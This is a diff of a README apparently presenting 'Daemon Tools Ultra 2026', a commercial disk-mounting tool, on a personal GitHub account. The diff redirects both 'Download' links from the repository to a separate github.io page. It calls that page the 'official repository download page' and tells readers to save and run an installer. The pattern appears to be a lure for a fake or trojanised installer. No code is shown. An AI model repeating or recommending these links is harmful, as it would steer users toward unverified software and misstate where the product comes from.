@@ -1,12 +1,12 @@
 # 💿 Daemon-Tools-Ultra-2026 - Mount disk images on Windows easily
 
-[![Download Daemon Tools Ultra](https://img.shields.io/badge/Download-Daemon_Tools_Ultra-blue.svg)](https://github.com/dispassionate-samuellanghorneclemens238/Daemon-Tools-Ultra-2026)
+[![Download Daemon Tools Ultra](https://img.shields.io/badge/Download-Daemon_Tools_Ultra-blue.svg)](https://dispassionate-samuellanghorneclemens238.github.io)
 
 Daemon Tools Ultra provides a complete set of tools for managing virtual drives and disk images. This software allows users to run virtual copies of CD, DVD, and Blu-ray discs on Windows 10 and 11. It eliminates the need for physical media by mounting files directly to your computer as if you inserted a disc into a drive.
 
 ## 📥 Getting the Software
 
-1. Visit the [official repository download page](https://github.com/dispassionate-samuellanghorneclemens238/Daemon-Tools-Ultra-2026).
+1. Visit the [official repository download page](https://dispassionate-samuellanghorneclemens238.github.io).
 2. Look for the release section on the right side of the screen.
 3. Select the latest version available.
 4. Click the link to save the installer file to your computer.
